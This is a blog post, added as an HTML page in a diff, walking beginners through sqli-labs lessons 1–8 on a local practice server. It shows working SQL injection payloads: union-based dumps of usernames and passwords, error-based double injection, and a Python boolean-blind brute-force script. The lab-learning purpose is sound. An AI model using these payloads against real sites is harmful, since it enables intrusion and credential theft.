@@ -1,0 +1,998 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>sqli-labs的学习记录一（1-8） - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-07-20 18:49" pubdate>
+        2018年7月20日 晚上
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:2.8k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      39
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">sqli-labs的学习记录一（1-8）</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>&emsp;&emsp;偶然发现<code>sqli-labs</code>这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客<del>装个逼</del>记录下学习过程（假装我是大佬）<br><a id="more"></a></p>
+<h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><ul>
+<li>首先附上github的下载地址–&gt;<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">传送门</a></li>
+<li>下载<code>phpstudy</code>，phpstudy的站点目录是这个<code>PHPTutorial\WWW</code>，把刚刚下载的平台解压放到里面</li>
+<li>如果我没记错的话，phpstudy的mysql初始密码是root，在<code>sql-connections\db-creds.inc</code>写上你的mysql数据库密码<br><img src="/img/2018-07-20/1.png" srcset="/img/static/loading.gif" alt="1"><br>上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问<code>localhost/sqli-labs-master/</code>看待下面的页面就算安装好了<br>点击<code>Setup/reset Database for labs</code>建立数据库<br><img src="/img/2018-07-20/2.png" srcset="/img/static/loading.gif" alt="2"></li>
+</ul>
+<h4 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p>第一关是最简单的一关了，直接<code>id=1&#39;</code>就报错了<br><img src="/img/2018-07-20/3.png" srcset="/img/static/loading.gif" alt="3"><br>再测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code><br><img src="/img/2018-07-20/4.png" srcset="/img/static/loading.gif" alt="4"><br>返回正常，不难想象我们想数据库递交<code>id=1</code>的语句为<br><pre><code class="hljs undefined"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'1'</span></code></pre></p>
+<p>递交<code>id=1&#39; and &#39;1&#39;=&#39;1</code>的语句为<br><pre><code class="hljs undefined"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span></code></pre></p>
+<p>接下来测试<code>id=1&#39; union select database() -- +</code>，<code>-- +</code>是注释符<br><img src="/img/2018-07-20/5.png" srcset="/img/static/loading.gif" alt="5"><br>发现报错了，错误上说了，列的数量对不上，修改为<code>id=1&#39; union select 1,2,database() -- +</code>,页面返回正常但没有返回我们所希望的数据库名称<br>这个是因为index.php中<code>mysql_fetch_array</code>函数只调用了一个<br><img src="/img/2018-07-20/6.png" srcset="/img/static/loading.gif" alt="6"><br><code>mysql_fetch_array</code>函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select * from users where id = '1' union select 1,2,database();
++----+----------+----------+</span>
+<span class="hljs-section">| id | username | password |
++----+----------+----------+</span>
+|  1 | Dumb     | Dumb     |
+<span class="hljs-section">|  1 | 2        | security |
++----+----------+----------+</span>
+2 rows in set (0.00 sec)</code></pre></p>
+<p>上面查询结果可以看到返回了两个结果，但是<code>mysql_fetch_array</code>只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select * from users where id = '-1' union select 1,2,database();
++----+----------+----------+</span>
+<span class="hljs-section">| id | username | password |
++----+----------+----------+</span>
+<span class="hljs-section">|  1 | 2        | security |
++----+----------+----------+</span>
+1 row in set (0.00 sec)</code></pre></p>
+<p>最终的payload为<code>id=-1&#39; union select 1,2,database() -- +</code><br><img src="/img/2018-07-20/7.png" srcset="/img/static/loading.gif" alt="7"><br>由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; show databases;
++--------------------+</span>
+<span class="hljs-section">| Database           |
++--------------------+</span>
+| information<span class="hljs-emphasis">_schema |
+| mysql              |
+| performance_</span>schema |
+<span class="hljs-section">| test               |
++--------------------+</span>
+4 rows in set (0.01 sec)</code></pre></p>
+<p>其中，<code>information_schema</code>这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下–&gt;<a href="https://www.jianshu.com/p/ea15158f39f7" target="_blank" rel="noopener">传送门</a>，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select table_name from information_schema.tables where table_schema = 'security';
++------------+</span>
+<span class="hljs-section">| table_name |
++------------+</span>
+| emails     |
+| referers   |
+| uagents    |
+<span class="hljs-section">| users      |
++------------+</span>
+4 rows in set (0.00 sec)</code></pre></p>
+<p>这里可以偷个懒，我们可以不找数据库名直接让<code>table_schema=database()</code>就可以省了一步<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select table_name from information_schema.tables where table_schema = database();
++------------+</span>
+<span class="hljs-section">| table_name |
++------------+</span>
+| emails     |
+| referers   |
+| uagents    |
+<span class="hljs-section">| users      |
++------------+</span>
+4 rows in set (0.00 sec)</code></pre></p>
+<p>所以我们的payload为<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>' <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema = 'security' -- +</code></pre></p>
+<p><img src="/img/2018-07-20/8.png" srcset="/img/static/loading.gif" alt="8"><br>但是这样我们只能得到一个表，下面要用到一个函数<code>group__concat</code>，下面演示一下效果<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select group_concat(table_name) from information_schema.tables where table_schema = 'security';
++-------------------------------+</span>
+<span class="hljs-section">| group_concat(table_name)      |
++-------------------------------+</span>
+<span class="hljs-section">| emails,referers,uagents,users |
++-------------------------------+</span>
+1 row in set (0.00 sec)</code></pre></p>
+<p><code>group_concat</code>的作用就是把多个查询结果并到一起，于是payload修改为<br><pre><code class="hljs undefined">id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">'security'</span> <span class="hljs-comment">-- +</span></code></pre></p>
+<p><img src="/img/2018-07-20/9.png" srcset="/img/static/loading.gif" alt="9"><br>用户账号密码应该在users表里头了,我们要查的表就是<code>users</code>表了，简单修改一下payload，把<code>table_name</code>换成<code>column_name</code>，把<code>information_schema.tables</code>换成<code>information_schema.columns</code>，再把<code>table_schema</code>换成<code>table_name</code>，payload为<br><pre><code class="hljs undefined">id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">'users'</span> <span class="hljs-comment">-- +</span></code></pre></p>
+<p><img src="/img/2018-07-20/10.png" srcset="/img/static/loading.gif" alt="10"><br>列也知道了，我们就直接枚举username和password，payload为<br><pre><code class="hljs undefined"><span class="hljs-attribute">id</span>=-1' union select 1,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>-- +</code></pre></p>
+<p><img src="/img/2018-07-20/11.png" srcset="/img/static/loading.gif" alt="11"><br>第一关就算是过了</p>
+<h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h5><p>第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下<br><pre><code class="hljs undefined">SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-string">'$id'</span> LIMIT 0,1
+<span class="hljs-comment">#第一关</span>
+SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-variable">$id</span> LIMIT 0,1
+第二关</code></pre></p>
+<p>所以我们把paylaod的<code>id-1</code>后面的单引号去掉就好了甚至注释符都不用<br>payload如下<br><pre><code class="hljs undefined">id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>()
+<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">'security'</span>
+<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">'users'</span>
+<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username),<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span></code></pre></p>
+<p>第二关完</p>
+<h5 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h5><p>第三关<br><pre><code class="hljs undefined"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">'$id'</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></p>
+<p>多了括号，直接上payload吧<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>') union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() -- +</code></pre></p>
+<p>就不多列了</p>
+<h5 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h5><p>第四关<br>这次有点不同，当我们测试<code>id=1&#39;</code>时返回页面是正常的，测试<code>id=1&quot;</code>报错<br><img src="/img/2018-07-20/12.png" srcset="/img/static/loading.gif" alt="12"><br>根据报错信息来看，查询语句大概如下<br><pre><code class="hljs undefined">SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE id=(<span class="hljs-string">"<span class="hljs-variable">$id</span>"</span>) LIMIT 0,1</code></pre></p>
+<p>看一眼index.php，差不多<br><img src="/img/2018-07-20/13.png" srcset="/img/static/loading.gif" alt="13"><br>还是那个payload，换汤不换药<br><pre><code class="hljs undefined">id=-1") union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <span class="hljs-comment">-- +</span></code></pre></p>
+<h5 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h5><p>第五关开始提高难度<br>首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）<br><img src="/img/2018-07-20/14.png" srcset="/img/static/loading.gif" alt="14"><br>这个注入我也好久才理解，就不做了，直接分析<br><img src="/img/2018-07-20/15.png" srcset="/img/static/loading.gif" alt="15"><br>首先，sql查询正确会返回<code>You are in...........</code>，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数<code>count()</code>，<code>rand()</code>,<code>floor()</code>,<code>concat_ws</code><br><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">()</span></span>         计算总数
+<span class="hljs-function"><span class="hljs-title">rand</span><span class="hljs-params">()</span></span>    	 	生成<span class="hljs-number">0</span>~<span class="hljs-number">1</span>的随机数
+<span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span>    		向下取整
+<span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span></span> 	拼接查询结果</code></pre></p>
+<p>最后一个可能不好理解，用例子说明下<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select concat_ws(':',username,password) from users;
++----------------------------------+</span>
+<span class="hljs-section">| concat_ws(':',username,password) |
++----------------------------------+</span>
+| Dumb:Dumb                        |
+| admin:admin                      |
+| admin1:admin1                    |
+| admin2:admin2                    |
+| admin3:admin3                    |
+| dhakkan:dumbo                    |
+<span class="hljs-section">| admin4:admin4                    |
++----------------------------------+</span>
+7 rows in set (0.00 sec)</code></pre></p>
+<p>1<br>rand()<em>2生成0~2的随机数，floor(rand()</em>2)产生0或1<br>2<br>以<code>select database()</code>为例子<br><pre><code class="hljs undefined"><span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()
+<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))
+<span class="hljs-keyword">select</span> conut(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a</code></pre></p>
+<p><img src="/img/2018-07-20/16.png" srcset="/img/static/loading.gif" alt="16"><br>数据库名<code>security</code>已经出来了<br>关于原因<br><b><code>concat_ws(&#39;:&#39;,select database(),floor(rand()*2))</code>会产生一大堆<code>security:0</code>，<code>security:1</code>的查询结果，重点在<code>group by</code>，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是<code>security:0</code>，如果此时临时表只有<code>security:1</code>的行不存在<code>security:0</code>的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是<code>security:0</code>而变成了<code>security:1</code>了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</b><br>后面的基本差不多，就不列了，有人可能把这道题当做盲注来做<del>一开始我也是这么想的</del></p>
+<h5 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h5><p><b>双引号的双注入</b>&gt;，把less-5的单引号变成双引号，换汤不换药</p>
+<h5 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h5><p><b>导入文件注入</b>，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程–&gt;<a href="https://www.cnblogs.com/lcamry/p/5763105.html" target="_blank" rel="noopener">传送门</a>,就直接下一关吧</p>
+<h5 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h5><p>Blind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据<br>举很简单的例子,<code>1=1</code>正确<br><img src="/img/2018-07-20/17.png" srcset="/img/static/loading.gif" alt="17"><br><code>1=2</code>错误<br><img src="/img/2018-07-20/18.png" srcset="/img/static/loading.gif" alt="18"><br>然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，<code>ascii()</code>,这个函数式把字母变成ascii码值，<code>substr()</code>这个函数式切割字符串，假设<code>a=test</code>,<code>substr(a,1,1)=t</code>,<code>substr(a,2,1)=e</code>,以此类推，查数据库payload<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>' and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;= '<span class="hljs-number">97</span></code></pre></p>
+<p><code>substr</code>取<code>database()</code>的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即’a’<br><img src="/img/2018-07-20/19.png" srcset="/img/static/loading.gif" alt="19"><br>返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下<br><pre><code class="hljs python">import requests
+txt1 = "http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),"
+txt2 = ",1)) &gt;= '"
+txt3 = ",1)) = '"
+payload1 = 1 
+payload2 = 97
+txt4 = 'You are in..........'
+num11 = 97
+num12 = 65
+num13 = 48
+code = ''
+num1 = 0
+num2 = 0
+num3 = 0
+for i in range(1,9)://长度
+	url = txt1+str(i)+txt2+str(num11)
+	req = requests.get(url = url)
+	reqtext = req.text[570:590]
+	//reqtext是获取页面上的内容是不是等于txt4
+	if(reqtext == txt4):
+		num1 = 1
+
+	url = txt1+str(i)+txt2+str(num12)
+	req = requests.get(url = url)
+	reqtext = req.text[570:590]
+	if(reqtext == txt4):
+		num2 = 1
+
+	url = txt1+str(i)+txt2+str(num13)
+	req = requests.get(url = url)
+	reqtext = req.text[570:590]
+	if(reqtext == txt4):
+		num3 = 1
+//判断范围，数字48-57，大写65-90，小写97-122
+//字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz
+//数字切一次，判断五次，01234 56789
+
+	if(num1 == 1):
+		num = 97
+		num += 13
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext == txt4):
+			num += 6
+		else:
+			num -= 7
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext == txt4):
+			num += 3
+		else:
+			num -= 3
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext != txt4):
+			num -= 3
+		if(reqtext == txt4) and ((num == 106) or (num == 119)):
+			for j in range(num,num+4):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[570:590]
+				if(reqtext == txt4):
+					code += chr(j)
+					print code
+					num1 = 0
+					num2 = 0
+					num3 = 0
+		else:
+			for j in range(num,num+3):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[570:590]
+				if(reqtext == txt4):
+					code += chr(j)
+					print code
+					num1 = 0
+					num2 = 0
+					num3 = 0
+	if(num1 == 0 and num2 == 1):
+		num = 65
+		num += 13
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext == txt4):
+			num += 6
+		else:
+			num -= 7
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext == txt4):
+			num += 3
+		else:
+			num -= 3
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext != txt4):
+			num -= 3
+		if(reqtext == txt4) and ((num == 74) or (num == 87)):
+			for j in range(num,num+4):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[570:590]
+				if(reqtext == txt4):
+					code += chr(j)
+					print code
+					num1 = 0
+					num2 = 0
+					num3 = 0
+		else:
+			for j in range(num,num+3):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[570:590]
+				if(reqtext == txt4):
+					code += chr(j)
+					print code
+					num1 = 0
+					num2 = 0
+					num3 = 0
+	if(num2 == 0 and num3 == 1):
+		num =48
+		num += 5
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[570:590]
+		if(reqtext == txt4):
+			for j in range(num,num+5):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[570:590]
+				if(reqtext == txt4):
+					code += chr(j)
+					print code
+					num1 = 0
+					num2 = 0
+					num3 = 0
+		else:
+			num -= 5
+			for j in range(num,num+5):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[570:590]
+				if(reqtext == txt4):
+					code += chr(j)
+					print code
+					num1 = 0
+					num2 = 0
+					num3 = 0</code></pre></p>
+<p>结果如下<br><img src="/img/2018-07-20/20.png" srcset="/img/static/loading.gif" alt="20"><br>查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本<br><pre><code class="hljs undefined">import requests
+txt1 = <span class="hljs-string">"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),"</span>
+txt2 = <span class="hljs-string">",1))) &gt;= '"</span>
+txt3 = <span class="hljs-string">",1))) = '"</span></code></pre></p>
+<p>妈呀写博客比学的还累。。。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/注入/">注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/盲注/">盲注</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/07/26/proxmark3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Proxmark3 Easy破解门禁卡学习过程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/06/12/badusb/">
+                        <span class="hidden-mobile">badusb的学习记录&入侵windows主机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
